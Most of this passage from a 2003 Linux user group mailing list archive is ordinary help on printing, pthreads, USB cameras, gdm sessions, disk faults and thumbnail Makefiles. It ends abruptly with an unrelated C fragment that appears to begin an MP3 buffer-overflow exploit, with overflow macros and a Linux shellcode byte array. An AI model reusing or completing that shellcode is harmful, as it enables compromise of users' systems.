India. Some of these companies operate at SEI CMM Level 5. They take the
right steps to provide software products that meet the stringent quality and
timely delivery requirements of its customers, by institutionalizing
efficient processes (SEI CMM) and best practices (Good Management
Practices). Cost is definitely a magnetizing factor but I don't think it can
sustain without delivering high quality services/products in time. If
offshore companies can't offer commitment to achieve improved productivity,
improved quality, provide value to customer, and accurately predict product
schedule and completion, it will not survive. 

Thanks
_tisson

jobs - and he cites this as a major impediment to economic growth here.
As an example he mentions that Mentor Graphics is investing $40million in
an R&D center in India.  When he asked Mentor why they were doing this, he
got this reply: "they can't hire anyone graduating from engineering
schools here because they're just not prepared, they're just not ready to
go into that sophisticated end of the business." Anybody else find this
statement not only disingenuous, but somewhat insulting?

Of course we know that the real reason is that they can pay Indian
engineers what amounts to minimum wage here.  Given the number of
engineers that are currently out of work (and a lot of us are going back
to school to improve our skills) they could easily staff up an R&D center
here.


Phil

On Sat, 2003-01-11 at 13:18, Jeme A Brelin wrote:

> I hate printers.

Me too.

> I've got a system here with CUPS, foomatic, and both parport and
parportPC
> modules installed and seemingly properly configured.
> 
> However, nothing seems to happen when you print anything and I can't
find
> a log of what should have happened.

Well, it sounds to me like things probably aren't properly configured. 
When you hit the CUPS web interface, can you print a test page to the
printer?  After you tell it to do that, if nothing happens with the
printer, have a gander at the 'recently printed' section and see if you
could tell it to reprint, look at the status of he job, etc.

Ten go in to your cups config file and increase the logging level. 
You'll get a shitload of debug info sent out to your logs.  Dig through
that and the answer may be there.  Also, I assume, you have hit the info
at linuxprinting.org?  There are mailing lists there - when I had
problems with my Lexmark, the folks there were very helpful - the lead
developer and lead doc writer actuallly figured out my problem.

> In fact, `cat /etc/motd > /dev/lp0` doesn't give me anything,
> either.  And, in my experience, that works regardless of your
> configuration.

Not with today's new-fangled printers.  More often than not, that won't
do diddly squat.

> I can print the printer's internal test page, so it's not like the
printer
> is totally bust.
> 
> My current guess is that it's a physical connection problem, but
wouldn't
> CUPS tell me something if that were the case?

Most likely, yes... but that depends on how you have things set up, your
printer, and what your log files are saying.

What kind of printer is it, anyway?  I assume you're using Debian... did
you apt-get cups or build it from source?  Does debian come with some
printer config tool or did you use the web interface or the cli
interface or what to set up your printer?  I would suggest using the web
interface, it worked well for me.

Good luck, let us know how it goes.

Rob

From jeme at brelin.net  Sat Jan 11 15:28:01 2003

Subject: SOLVED: Re: [PLUG] CUPS, /dev/lp0 and nothing.
In-Reply-To: <1042321704.21140.10.camel@duron.stpaultel.com>

I must say that I wrote my first message (with very little data) out of
frustration and laziness.  I'd worked on this machine last night when I
was really sleepy and then got around to it this afternoon assuming it was
a hardware problem.

Well, it was nothing of the sort.

After turning the logging up, I saw log entries that led me to believe
there was a ghostscript error.  But after trying the gs-alladin package
and getting the same result, I went back to GNU ghostscript and looked
into other possibilities.  I ran the foomatic-gswrapper line as given in
the logs from the command-line (modified to read the testprint.ps directly
instead of from stdin) and got no errors.  I then tried piping that out
put to pnm2ppa as is shown in the logfile, but when I typed pnm2<tab>, I
got a beep for my trouble.  Heh.

Turns out, I didn't even have the pnm2ppa package installed.  Pfft.  
Also, the package doesn't really seem to configure itself, so I had to
create a symlink from /etc/ppa/pnm2ppa.conf.hp820 to /etc/pnm2ppa.conf.  
No big deal.

All works seemingly flawlessly now.

What follows is what I was writing when I decided to take Rob's excellent
(and simple) advice to crank up the logging and watch the output.

From heinlein at attbi.com  Sun Jan 12 08:30:02 2003
From: heinlein at attbi.com (Paul Heinlein)
Date: Sun Jan 12 08:30:02 2003
Subject: [PLUG] Which ports to log?
In-Reply-To: <200301111929.03301.griffint@pobox.com>
Message-ID: <Pine.LNX.4.44.0301120827130.4776-100000@pecos.madboa.com>

On Sat, 11 Jan 2003, Terry Griffin wrote:

> When setting up a firewall with ipchains/iptables, which ports to
> you find most useful to log? I'm finding there's a fine line between
> not enough information and *way* too much information.

I basically log every SYN packet that's denied. It generates a lot of 
info, but it's the only way I've been able to distinguish a host that 
port scanning me from one that's looking for a certain vulnerability 
on a certain port.

--Paul Heinlein <heinlein at attbi.com>

From alan at clueserver.org  Sun Jan 12 14:07:01 2003
From: alan at clueserver.org (Alan)
Date: Sun Jan 12 14:07:01 2003
Subject: [PLUG] pthreads/glibc question
In-Reply-To: <1042402890.21068.6.camel@zontar.clueserver.org>
References: <1042402890.21068.6.camel@zontar.clueserver.org>
Message-ID: <1042406912.21366.6.camel@zontar.clueserver.org>

On Sun, 2003-01-12 at 12:21, Alan wrote:
> I am in the process of researching this, but maybe someone here knows
> off the top of their head...
> 
> I am using the Redhat 8.0.92 beta.  It uses glibc 2.3.1 and gcc 3.2.1.  
> 
> I have been getting lockups, but I built a stock kernel version
> 2.4.21-pre3 with the options from the Athlon smp kernel used by Redhat.
> 
> It boots fine, but pthreads will *not* function at all.
> 
> Does anyone have an idea why?  I was not aware of any dependancies of
> pthreads on the kernel version and/or kernel patches needed to support
> pthreads.  The pthreads library is the one that comes from the glibc
> package.
> 
> May not seem like a big deal, but there are a number of things that
> depend on pthreads.  (Like anything using Gnome 2.)
> 
> Ideas?

I am starting to get a handle on the problem.

It seems that the new version of Redhat uses a couple of kernel patches
used by glibc. They do not apply cleanly to the stock kernel. (They use
the o1 scheduler patch and a threading patch.) The thread library they
are using is different as well. They are using the nptl library.

I am starting to suspect that this is the cause of my system hang
problems.

Ah, the joys of betas...

-- 
Alan <alan at clueserver.org>

From aarghj at yahoo.com  Sun Jan 12 16:20:02 2003

Ok, My 2 bits....

I have qwest business dsl.  It is fantastic service,
without an outage one or even a temporary slowdown
since connection.  thats the good.  

the bad is here:
First, It took almost two months to get service in my
new location when it was SUPPOSED to be turned up when
I moved in.  

Second, I was quoted 5 different prices in the same
day for the same service, 3 of which came from the
SAME REPRESENTATIVE!

Third, when the line was live, on my BUSINESS account,
they shipped me a USB only dsl modem!  hardly works
with my firewall or routing equipment. another two
weeks later, I had a nice but not much documented
actiontek wireless capable dsl modem/router.  

Lastly, all in all, I would say that I have spent at
the very least 30 hours(highly conservative, 10 hours
in one day alone) on the phone with qwest to get both
the billing and the physical connectivity situations
squared away.  

So, to summarize, the actual connection is fantastic,
and very stable. but the customer service is in no
uncertain terms shit.  absolutely.  I cannot stand
their customer service. their customer service is so
horrible that they ended up reversing two months worth
of charges and giving an additional free month just to
make up for the hassles I had to go through to get
things the way they should have been when I originally
ordered it.  Would I do it again?  hell no.  I would
go with any other isp possible, just so that I didnt
have to deal with the folks at qwest.  Please do your
research before you sign a contract with qwest.  you
will be happier if you do.  

and as far as msn, I do believe that msn is now their
only choice of isp for residential accounts, but other
isp's in the area can contract dsl over qwest's lines.
 gotta love deregulation.  

John

From xhabbo at mac.com  Sun Jan 12 18:33:01 2003
From: xhabbo at mac.com (David Giraud)
Date: Sun Jan 12 18:33:01 2003
Subject: [PLUG] USB digital camera
In-Reply-To: <20030113001515.93252.qmail@web9606.mail.yahoo.com>
References: <20030113001515.93252.qmail@web9606.mail.yahoo.com>
Message-ID: <1042425538.6820.16.camel@rashomon.thecore.org>


I don't own a digital camera nor do I consider myself a Linux guru but I
might be able to give you a start on how to fix your problem.

On Sun, 2003-01-12 at 16:15, Robert Kopp wrote:

> where is the file drivers/usb/...etc.?

Did you try /dev/usb?  There might be a storage storage directory in
there.  It's the only place I could think of.  It could be different if
you're running devfs, some directories can be changed around but they
are still under /dev/usb. (I'm running devfs and this happens with my
Sony Clie)

>  Do I have the USB storage module installed?

Assuming you have your kernel source:

# cd /usr/src/linux
# make menu config

Go to USB Support and enable USB Mass Storage Support.  You might need
to select a special option depending on what media you want mounted.  If
you change things, save the configuration file, rebuild the kernel and
move the bzImage to the proper place on your system and reboot.

>  How can I find
> out? If the device likes to call itself /dev/sda1, 

If your computer detects your camera, it will output a messege in your
syslog.  Try-

$ dmesg

to see everything or

$ dmesg |grep usb

to see whats on USB.

> I suppose that mounting it should be no problem.

Just like anything else. :)

I hope this helps you out.

P.S.  This is my first post to this group.  Please tell me if I'm wrong
in my advice. :)

-- 
David Giraud <xhabbo at mac.com>
Powered by Gentoo Linux
Running Linux Since Oct. 2002




From alan at clueserver.org  Sun Jan 12 18:51:01 2003
From: alan at clueserver.org (Alan)
Date: Sun Jan 12 18:51:01 2003
Subject: [PLUG] USB digital camera
In-Reply-To: <20030113001515.93252.qmail@web9606.mail.yahoo.com>
References: <20030113001515.93252.qmail@web9606.mail.yahoo.com>
Message-ID: <1042423973.22568.3.camel@zontar.clueserver.org>

On Sun, 2003-01-12 at 16:15, Robert Kopp wrote:
> I have an Olympus D-100 digital camera which, although
> apparently not included in gphoto, can be mounted as a
> storage device some other way. This camera is popular
> and has many favorable reviews. 
> 
>  "(Even works on linux with a little kernel tweak: in
> drivers/usb/storage/transport.h, search from "x53" and
> change it to "x55". Make sure you have the usb storage
> module installed, and then 'mount /dev/sda1 /mnt'.)"
> 
> Comments: where is the file drivers/usb/...etc.? Do I
> have the USB storage module installed? How can I find
> out? If the device likes to call itself /dev/sda1, I
> suppose that mounting it should be no problem. 
> 
> >From the typical consumer's point of view, access to
> digital cameras may be an important factor in the
> acceptance of Linux. If digital photography is
> important to a person, it might be the only reason why
> they need a native Windows partition, unless their
> digital camera can be accessed under Linux. It may not
> be realistic to expect 100% of digital cameras to be
> supported under Linux, but there should be enough of a
> choice that optical qualities can be the most
> important factor when deciding which digital camera to get.

USB storage also requires SCSI to be enabled.  This is important to know
if you build your own kernels and use something somewhat old.  (It was
patched in the later kernels.)

You can also get a pcmcia converter for whatever storage media you may
have.  They work just like a drive and requires no tweaks to the
kernel.  (Only works if you have pcmcia however...)


-- 
Alan <alan at clueserver.org>

>

> couple of kernel patches
> used by glibc. They do not apply cleanly to the
> stock kernel. (They use
> the o1 scheduler patch and a threading patch.) The
> thread library they
> are using is different as well. They are using the
> nptl library.
> 
> I am starting to suspect that this is the cause of
> my system hang
> problems.
> 
> Ah, the joys of betas...
>

From fedorp at wv.mentorg.com  Sun Jan 12 19:52:02 2003
From: fedorp at wv.mentorg.com (Fedor G. Pikus)
Date: Sun Jan 12 19:52:02 2003
Subject: [PLUG] USB digital camera
In-Reply-To: <20030113001515.93252.qmail@web9606.mail.yahoo.com>
Message-ID: <Pine.LNX.4.31.0301121946480.6926-100000@lorien.wv.mentorg.com>

You need to load usbstorage module if it does not load by itself
when you plug in the camera, try "modprobe usbstorage".
If it works, look at /proc/scsi/scsi file, your camera will appear
as one of SCSI devices (so it'll show up as /dev/sda if you don't have any
other SCSI devices). If the module does not load, or cannot be found, your
kernel does not have the USB support compiled in and configured properly.

Also, if the camera uses compactflash, you can just get a USB reader for
flash and not mess with getting camera supported (I never got my Vivitar
camera working with USB, it starts giving SCSI resets which never stop,
but the flash from it can be read in the card reader just fine).

From griffint at pobox.com  Sun Jan 12 20:39:02 2003
From: griffint at pobox.com (Terry Griffin)
Date: Sun Jan 12 20:39:02 2003
Subject: [PLUG] pthreads/glibc question
In-Reply-To: <1042402890.21068.6.camel@zontar.clueserver.org>
References: <1042402890.21068.6.camel@zontar.clueserver.org>
Message-ID: <200301122038.51951.griffint@pobox.com>

There are three different pthread libraries for Linux. There's the original
LinuxThreads that you find in all current distributions (as part of glibc),
then two newer versions, NGPT from IBM, and NPTL from Ulrich Drepper
and Ingol Molnar of Red Hat. Both require kernel features that were added
in the 2.5 kernel, although the changes required for NGPT were very modest
while for NPTL they were quite drastic.

My guess is that the Red Hat beta release uses NPTL for POSIX threads,
and to make it work they back-ported (a lot of) stuff from 2.5 in to their
2.4 kernel. So... if you run a stock 2.4 kernel, NPTL pthreads wouldn't
work.

All this is happening because the original LinuxThreads library had two
serious problems. It wasn't POSIX compliant and performance really sucked for
very large numbers of threads. Both NGPT and NPTL fix both of these problems.
Preliminary testing shows that NPTL out-performs NGPT, at least in certain
scenarios.

Your options are: (1) Get the source code to the older LinuxThreads library,
build it and install that as your pthreads library, (2) run a 2.5 kernel, or
(3) go back to Red Hat's kernel.

Terry

From plug at magnetinternet.com  Mon Jan 13 07:19:01 2003

Subject: [PLUG] PDXLUG
Message-ID: <51654.63.105.24.103.1042471106.squirrel@webmail.magnetinternet.com>

Hello all,

Just wanted to let you know there yet another LUG in Portland.  Portland
Linux Users Group (NOT to be confused with Portland Linux/Unix Group) has
been established as an alternative branch of PLUG.   We want the group to
focus on Linux and open-source; pretty much PLUG without the Unix part.  I
am hosting the web site and mailing list on my server.  Robby Russell
designed the web site for PDXLUG.

This is your chance to make a new user group the way you want it to be. 
We are not holding meetings until we get an established user base.  But
you can join the mailing list
(http://www.pdxlug.org/mailman/listinfo/pdxlug) and participate online. 
Help decide which way the web site should go.  Help decide where and when
meetings will be held.  Of course the list is also for good old fashioned
support questions. ;-)

We are not a group of 'PLUG Haters', we would like to peacefully co-exist
with PLUG.  But recent events have made it clear there has to be an
alternative group, or at least an alternative mailing list.

Anyway, comments and questions welcome.  But it won't do any good to
flame, as I won't reply.

Web Site: http://www.pdxlug.org
Mailing List: http://www.pdxlug.org/mailman/listinfo/pdxlug

-- 
Matt King
magnet | internet
http://www.magnetinternet.com

> that time comes.
> 
> The new versions are
>      TeX 3.141592
>        (four bugs fixed: two re leaders, two re alignments)
>      METAFONT 2.71828
>        (one bug fixed, re autorounding of huge paths)
>      TANGLE 4.5
>        (a trivial change re numeric comments, possibly unnecessary)
>      VFtoVP 1.3
>        (small correction to the out-of-range error correction)
>      PLAIN.TEX, HYPHEN.TEX, PLAIN.MF
>        (only the uncopyright notice has changed)
>      CMBASE.MF, ACCENT.MF CSC.MF
>        (improvements in robustness, but nothing major;
>           only the numeral 7 is affected slightly, in cmbx5 thru cmbx8)
>      ERRATA.TEX, TEX82.BUG, MF84.BUG, CM85.BUG, ERRORLOG.TEX, ERRATA.TEN
>        (details of the recent changes)

> to GNU Pascal; those should be ignored. I tried to install GPC in 2000,

else?

That's almost wierd - my grandfather's machine just had the same
problem.  Don't suppose they lived in Redmond, OR?  lol

> I opened the case, tightened a loose screw for the card that has the
> serial port connector, connected the mouse, keyboard, monitor, and
> applied power. I hit <DEL> to check out the BIOS settings and found them
> correct for the installed drive, so I exited BIOS and waited for the

But of course.  This is always the case.  Somebody needs to type it up
and make it into a law.  *Whenever* you want to show somebody else
exactly what your computer is doing wrong, it works as it should!

> My questions is, should I be concerned that something is about to fail?
> What should I be looking for, if it is? Has this happened to anyone
> else?

It could well have been a loose cable.

It could also be the hard disk going out, the cable being broken, the
IDE controller dying, etc, etc, etc, etc....

Check and make sure he IDE and power cables are snug (IDE at both ends,
power at just the drive end).  You said the serial port plugged in to a
card - ouch... old system?  If so, does the drive plug in to a card, as
well?  Make sure that card is in securely.

Have fun.  :-)

Rob

In-Reply-To: <20030113001515.93252.qmail@web9606.mail.yahoo.com>

On Sun, 12 Jan 2003, Robert Kopp wrote:

> I have an Olympus D-100 digital camera which, although apparently not
> included in gphoto, can be mounted as a storage device some other way.
> This camera is popular and has many favorable reviews.
>                                                                                
> "(Even works on linux with a little kernel tweak: in
> drivers/usb/storage/transport.h, search from "x53" and change it to
> "x55". Make sure you have the usb storage module installed, and then
> 'mount /dev/sda1 /mnt'.)"

<snip>

I have an Olympus C3030 and it has worked great ever since the early 2.4
kernels. As I remember it wasn't on the supported list for gphoto when I
got it, so I just picked the closest match (the C2000, as I remember). The
list of supported cameras was compiled from user reports, it's not
definitive. Also, there appear to be very few digital camera chipsets out
there - so, if it works with one Olympus it is highly likely to work with
others.

It seems to me that if you are able to use it as a storage device, you
should be able to use it from gphoto or gtkam. What distribution and
kernel are you running?

Lastly, if/when you get it working you should report it the gphoto and/or
gtkam people. That way they can add it to the supported list.

Dan

From octopus024 at yahoo.com  Mon Jan 13 11:36:01 2003
From: octopus024 at yahoo.com (Scott VanHoosen)
Date: Mon Jan 13 11:36:01 2003
Subject: [PLUG] Disk Hardware Problem
In-Reply-To: <3E230614.6B5CEB67@attbi.com>
Message-ID: <20030113193542.81998.qmail@web10407.mail.yahoo.com>

It's possible that one of the cards was loose in the slot, or a cable
might be loose. This could explain why it failed to work at
mom-in-law's house but worked after you brought it to your house. The
jostling around maybe have wiggled it back into contact.

I would recommend opening it up, and re-seating all the cards, giving
them a firm push into their slots. Also make sure all cables are pushed
firmly into place. I used to have a computer who's video card never
seated quite right. I finally had to remove it, slightly bend the piece
that gets screwed to the case, then fasten it back in, which fixed the
problem.

-Scott

From raanders at acm.org  Mon Jan 13 12:08:02 2003
From: raanders at acm.org (Roderick A. Anderson)
Date: Mon Jan 13 12:08:02 2003
Subject: [PLUG] Resolved: Disk Hardware Problem
In-Reply-To: <3E230D09.514DC58C@attbi.com>
Message-ID: <Pine.LNX.4.33.0301131155230.28212-100000@main.cyber-office.net>

On Mon, 13 Jan 2003, Richard Steffens wrote:

> Now that you mention it, that is the first thing I checked. I wiggled
> the connectors at both ends of the IDE cable, and pressed them home.
> They seemed to be snug. Same with the power connector.

I had a strange problem with a SCSI drive (CD burner).  It was giving me
the fits.  One time it would burn the next not.  Sometimes it showed as
device 3, next as 5 and sometimes not at all.  I took the system _apart_
and while looking at the drive the device ID selector jumper fell off.  
Damn thing was loose.  Installed a new jumper, that was tight, and
everything worked great and still is.  I have that jumper taped to my
monitor to remind me to check _ALL_ connections when things seem strange.
   Then a few weeks ago I went out on a job and the only thing I did after
looking for software/configuration problems was to re-seat the cable for
an IDE Travan 8 tape drive.  Well I did do a little cleaning - kicked out
the bigger dust-bunnys and gave the heads and drive roller a light
cleaning - but it didn't work until I unplugged and re-seated the IDE
cables on the main board.


Rod

From mindglow at got-roots.com  Mon Jan 13 12:32:02 2003
From: mindglow at got-roots.com (Doug Davis)
Date: Mon Jan 13 12:32:02 2003
Subject: [PLUG] Using other window managers with gdm
In-Reply-To: <1042488996.2776.9.camel@localhost.localdomain>
References: <1042488996.2776.9.camel@localhost.localdomain>
Message-ID: <1042489961.4110.7.camel@alvin.energy.nrgroot.com>

On Mon, 2003-01-13 at 12:16, Aaron Baer wrote:
> Is anyone using gdm(2) as their login manager under Debian and then
> using some other desktop environment other than gnome? ie. blackbox or
> icewm..
> 
> I'm trying to track down some good advice or documentation to allow me
> to fire off those environments.
> 
> A-
All you have to do is create a file under /etc/X11/gdm/Sessions with the
name of whatever you want to label to be in your gdm sessions. This file
should contain the full path to the startup program and be executable.

For example, I have the file  /etc/X11/gdm/Sessions/Fluxbox that
contains the line "/usr/local/bin/fluxbox" to launch my fluxbox session.

This is RedHat, so your path might be different with Debian, but I
believe the concept is the same.

BTW, Fluxbox is really a nice system if you haven't tried it and like
fast and visually unobtrusive window managers. It's based on blackbox
and has a few enhancements like tabs. It is written entirely in C++ and
has no library dependencies. It also supports KDE and Gnome apps as
well.

-- 
Doug Davis <mindglow at got-roots.com>

> Is anyone using gdm(2) as their login manager under Debian and then
> using some other desktop environment other than gnome? ie. blackbox or
> icewm..
> 

I don't use gdm, but when KDE tries to take over my "Xsession", I just
create a file in my home directory called .xsession and put the single
line:

blackbox

in the newly created file (don't forget to press "enter" at the end of
the line).  This will load blackbox instead of KDE.  You might try
changing login managers if gdm still insists on loading gnome.  I think
xdm is a friendly login manager that doesn't care what window manager is
loaded.

> I'm trying to track down some good advice or documentation to allow me
> to fire off those environments.
> 

Good Luck,

Derek Loree




From judah at opusnet.com  Mon Jan 13 12:33:11 2003
From: judah at opusnet.com (Aaron Baer)
Date: Mon Jan 13 12:33:11 2003
Subject: [PLUG] Using other window managers with gdm
In-Reply-To: <1042488996.2776.9.camel@localhost.localdomain>
References: <1042488996.2776.9.camel@localhost.localdomain>
Message-ID: <1042489960.2780.14.camel@localhost.localdomain>

I seem to have answered my question already.. 

go to /etc/gdm/Sessions

vi Blackbox

add the line 
/usr/bin/blackbox
save the file

chmod 755 Blackbox  (chmod u+x Blackbox)

restart gdm with ctl+alt+backspace or your prefered method.. 

the session will be added as a choice in the Session chooser.

This can be done with icewm as well in the same way.

(These directories reflect the Debian Woody machine path names may
change for other systems but it should function the same way)
A-

On Mon, 2003-01-13 at 10:31, Richard Steffens wrote:
> Yesterday, my mother-in-law's machine developed a hard disk problem.
> When power is applied, the motherboard boots, but says (something to the
> effect of hard disk error). I booted with a floppy, but it couldn't find

> should they become necessary.
> 
> I opened the case, tightened a loose screw for the card that has the
> serial port connector, connected the mouse, keyboard, monitor, and
> applied power. I hit <DEL> to check out the BIOS settings and found them
> correct for the installed drive, so I exited BIOS and waited for the
> error message (so I could give you a direct quote). Of course, the
> machine booted just fine!

> What should I be looking for, if it is? Has this happened to anyone

Many times; costumers would pack up their computer, bring it in to the
store, and it would work just fine.  I used to joke about needing to
take your computer out for a walk more often.  It is a bit frustrating,
knowing in the back of your mind that something is probably wrong, but
until it becomes a more consistent problem, it is impossible to
diagnose.

Loose cables, oxidized connections (re-seating will clean the oxide),
heat build up (does granny stuff her box into a closed cubby?), weak
power supply, bad house power (old wiring, poor grounding, inductive
motors on the same circuit), static, extra stand-off under the
motherboard (flex the case just right and you have a nice short to
ground), the list of possibilities goes on and on.
> 
> Thanks in advance for any guidance.

HTH a little anyway,

Derek Loree




From jeme at brelin.net  Mon Jan 13 13:38:02 2003
From: jeme at brelin.net (Jeme A Brelin)
Date: Mon Jan 13 13:38:02 2003
Subject: [PLUG] USB digital camera
In-Reply-To: <Pine.LNX.4.44.0301131120160.23936-100000@appl-ecosys.com>
Message-ID: <Pine.LNX.4.21.0301131330010.14263-100000@shaft.bitmine.net>

There really is a question at the bottom regarding images and generating
thumbnails.

On Mon, 13 Jan 2003, Rich Shepard wrote:
> On Mon, 13 Jan 2003, Dan Haskell wrote:
>   I bought my Olympus D-340L a number of years ago (1996? 1997?) and
> bought that brand because the chipset is supported by photopc. That's
> the software I've been using ever since. The camera has a serial
> connection (slow, but so what?) and it's worked without any problems.

Wow, this thread meshes nicely with what I did last night!

I have an old Olympus D-360L (I believe the model that replaced
Rich's) that I've been using for years.

It also has the serial connection and it's freakin' dog slow.  Plus,
there's a bug in gphoto that can cause it to retrieve 4k of an image and
then stop as though it's complete.  To work around that bug and to make
sure my pictures come out with the naming convention that I like, I wrote
a perl script to wrap gphoto (couldn't find a gphoto module) and do some
kludgy error checking and name my files nicely.

Anyway, I got a Radio Shack ("You've got questions, we've got blank
stares.") flyer in my mail and flipped through it.  They are selling the
Dazzle Smart Media Card Reader for 19.95 with a $10 mail-in rebate.  I
figured that was a reasonable enough price point for the potential time
savings of just mounting the card and moving the files.

Well, hell!  It works BEAUTIFULLY. Better than expected, actually.  While
the camera takes about two seconds to save a single picture to the card,
the reader can read and write to the card just about instantly.  I've got
UHCI and USB-storage compiled into my 2.4.20 kernel and there it is on
/dev/sda (with the data in /dev/sda1).  [side question:  What happens when
you've got SCSI hard disks as well?  I only have SCSI CD drives which
are /dev/scd.]

So I added a line to /etc/fstab as follows:
/dev/sda1       /smc            auto    defaults,user,noauto            00

And I made the device read and writable by all.

Now I just mount /smc and move the files from the weird path in which the
camera places them (/smc/dcim/100olymp where the images are named oddly,
but sequentially) to my usual storage location and the card is
clean.  Unmount and pull out the thing.

It's really sweet.

Anyway, I liked the gphoto interface because I could pull the images as
well as thumbnails from the camera.  It appears that the thumbnails were
actually being generated by the camera because they're not on the card.

So I'm writing a different script to grab my pictures off of the smart
card and name them appropriately, but I don't know how to generate the
thumbnails that the camera would use.  I can resize the images, but that's
not exactly what it used to do (near as I can tell).

Dig this:

jbrelin at person:~/pics$ file 20000622-001.jpg 20000622-thumbnail-001.jpg 
20000622-001.jpg:           JPEG image data, EXIF standard 0.73, 10752 x
2048
20000622-thumbnail-001.jpg: JPEG image data 46.38, thumbnail 65x61, 13874
x 13893

What's that all about?  How do I generate thumbnails that aren't simply
scaled down standard JPEGs?

J.

Yeah.  A year ago I posted something here about the same problem.  I
was draining 4 AA camera batteries *just* downloading.  The USB Smart
Media reader (a CompUSA store brand, $29 a year ago) was an immense
improvement.  The _one_ drawback that I've noticed is that with this
kind of data transfer there isn't an easy opportunity to resynchronize
the camera clock.

Jeme> Anyway, I liked the gphoto interface because I could pull the
Jeme> images as well as thumbnails from the camera.  It appears that
Jeme> the thumbnails were actually being generated by the camera
Jeme> because they're not on the card.

Jeme> So I'm writing a different script to grab my pictures off of the
Jeme> smart card and name them appropriately, but I don't know how to
Jeme> generate the thumbnails that the camera would use.  I can resize
Jeme> the images, but that's not exactly what it used to do (near as I
Jeme> can tell).

Hmm.  Well, you've said what you don't want to do, but you haven't
been real clear on the affirmative side: what _do_ you want?

For thumbnails, I've just been using:

  convert -geometry '10%' <ifname> <ofname>

On my Debian/unstable box, "convert" comes from the imagemagick
package.  Salt to taste.

I've got a photo album system for a web server that generates
thumbnails and intermediate preview size images and associated HTML
glue from a single 41-line (including blanks) Makefile.  

Each time I copy off images from the SmartMedia, I create a dated
subdirectory and hardlink the Makefile into that directory.  I retain
the original Olympus-goofy filenames.  I cd to that directory and
type: "make", and after it gets done I've got a nice index.html file
that serves as an entry point in that folder.  Click on the thumbnail
and the intermediate sized image in the bigger frame to the right,
click on the intermediate sized image and get the full-sized image.

I have seen some browsers get confused by the frames and actually
display two columns of thumbnails down the left side at first.  It
hasn't bothered Mozilla, so I haven't cared too much what exactly is
going on.  I think the extra column goes away when you click on a
thumbnail.

Here is the Makefile I've been using:


SHELL=/bin/sh

.PHONY : clean-html clean-images clean-makefile all

all : clean-html index.html thumbnails.html $(patsubst %,album/%,$(wildcard *.JPG)) $(patsubst %.JPG,%.html,$(wildcard *.JPG)) $(patsubst %,thumbnails/%,$(wildcard *.JPG))

album :
	mkdir album

thumbnails :
	mkdir thumbnails

clean-html :
	rm -f *.html

clean-images :
	rm -rf album thumbnails

clean-makefile : 
	rm -f Makefile


%.html : %.JPG
	@echo "Making $@"
	@echo "<html><head><title>$^</title></head><body><a href=\"$^\" TARGET=\"right\"><img src=\"album/$^\"></a></body></html>" > $@

album/%.JPG : %.JPG
	convert -geometry '50%' $^ $@

thumbnails/%.JPG : %.JPG
	convert -geometry '10%' $^ $@

index.html :
	echo "<html><head><title>Photo Album</title></head><frameset COLS=\"160,*\"><frame SRC=\"thumbnails.html\" NAME=\"left\"><frame SRC=\"\" NAME=\"right\"></frameset><noframes></noframes></html>" > index.html


thumbnails.html : thumbnails album
	@echo "<html><head><title>Photo Album</title></head><body><center>" > thumbnails.html
	@echo $(foreach VAR,$(patsubst %.JPG,%,$(wildcard *.JPG)),"<a href=\"$(VAR).html\" TARGET=\"right\"><img src=\"thumbnails/$(VAR).JPG\" alt=\"$(VAR).JPG\"vspace=\"3\"></a><br>" >> thumbnails.html)
	@echo "</center></body></html>" >> thumbnails.html

From fedorp at wv.mentorg.com  Mon Jan 13 14:16:02 2003

On Mon, 13 Jan 2003, Jeme A Brelin wrote:
> /dev/sda (with the data in /dev/sda1).  [side question:  What happens when
> you've got SCSI hard disks as well?  I only have SCSI CD drives which
> are /dev/scd.]
You get sdb, sdc, etc. The order is determined by the order of SCSI adapters
first. I.e. the first SCSI module you load will be scsi0, say, it's your real
SCSI card, and there are disks there, sda and sdb, then you load usbstorage
and get scsi1 and sdc. I don't know what determines the order inside USB
subsystem (order of plugging in if you plug them in one at a time, but if
you have 2 devices connected when you load usbstorage then I don't know).

> Anyway, I liked the gphoto interface because I could pull the images as
> well as thumbnails from the camera.  It appears that the thumbnails were
> actually being generated by the camera because they're not on the card.
They are generated by the camera. I don't know how your camera works, but
the ones I know generate thumbnails "inside" the main file (like Photoshop
embeds its "preview" image into a large image file).

> What's that all about?  How do I generate thumbnails that aren't simply
> scaled down standard JPEGs?
That's what the thumbnails usually are, lower-resolution lower-quality JPEGs.
The standard Linux way of generating them is to use ImageMagic, it has
command-line tools for converting and rescaling images. I don't know how to
generate an image with embedded preview though (but then I've never seen
anything except Photoshop to make use of these previews, other image
viewers either ignore them or get confused by them).

On Mon, 13 Jan 2003, Jeme A Brelin wrote:

> Anyway, I liked the gphoto interface because I could pull the images as
> well as thumbnails from the camera.  It appears that the thumbnails were
> actually being generated by the camera because they're not on the card.
> 
> So I'm writing a different script to grab my pictures off of the smart
> card and name them appropriately, but I don't know how to generate th
> thumbnails that the camera would use.  I can resize the images, but that's
> not exactly what it used to do (near as I can tell).

Most cameras store EXIF tags with each picture. EXIF tags contain metadata
about the picture (camera model, shutters speed, etc) AND a thumbnail.
What you need is an EXIF aware tool. Do a search on Freshmeat for EXIF and
you'll get a list of several (I haven't tried most, so I'm not recommending
one).

Dan

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>

#define NORMAL_OVF

#define VERSION "0.1"

#define FALSE   0
#define TRUE    1

#define WRITE_ERROR   { perror("write"); close(fd); exit(1); }
#define STATE         { fprintf(stderr, "\n* header (%p) state: %x: ", header, 
state); state ++; ltb(header); }
#define MP3_SIZE      (((160 * 144000)/8000) - 3) + 8  

#define MAX_INPUT_FRAMESIZE 1920

unsigned char linux_shellcode[] = /* contributed by antiNSA */
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x3b\x50\x31\xc0\x68\x6f"
